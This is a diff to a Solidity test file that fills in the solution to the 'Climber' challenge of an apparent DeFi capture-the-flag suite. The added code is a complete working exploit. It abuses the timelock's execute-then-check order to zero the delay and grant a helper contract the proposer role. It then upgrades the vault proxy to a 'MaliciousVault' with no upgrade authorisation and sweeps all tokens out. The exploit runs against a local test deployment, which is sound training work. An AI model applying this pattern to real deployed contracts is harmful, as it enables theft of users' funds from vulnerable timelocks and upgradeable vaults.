@@ -7,6 +7,10 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +89,40 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MaliciousVault maliciousImpl = new MaliciousVault();
+        Scheduler scheduler = new Scheduler(address(timelock));
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            PROPOSER_ROLE,
+            address(scheduler)
+        );
+
+        targets[2] = address(vault);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            address(maliciousImpl),
+            bytes("")
+        );
+
+        targets[3] = address(scheduler);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+
+        scheduler.storeBatch(targets, values, dataElements);
+        timelock.execute(targets, values, dataElements, bytes32(0));
+        MaliciousVault(address(vault)).sweepFunds(address(token), recovery);
     }
 
     /**
@@ -94,5 +131,43 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    function _authorizeUpgrade(address) internal override {}
+
+    function sweepFunds(address token, address recipient) external {
+        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+contract Scheduler {
+    ClimberTimelock private immutable timelock;
+
+    address[] public targets;
+    uint256[] public values;
+    bytes[] public dataElements;
+
+    constructor(address _timelock) {
+        timelock = ClimberTimelock(payable(_timelock));
+    }
+
+    function storeBatch(
+        address[] calldata _targets,
+        uint256[] calldata _values,
+        bytes[] calldata _dataElements
+    ) external {
+        for (uint256 i = 0; i < _targets.length; i++) {
+            targets.push(_targets[i]);
+            values.push(_values[i]);
+            dataElements.push(_dataElements[i]);
+        }
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, bytes32(0));
     }
 }
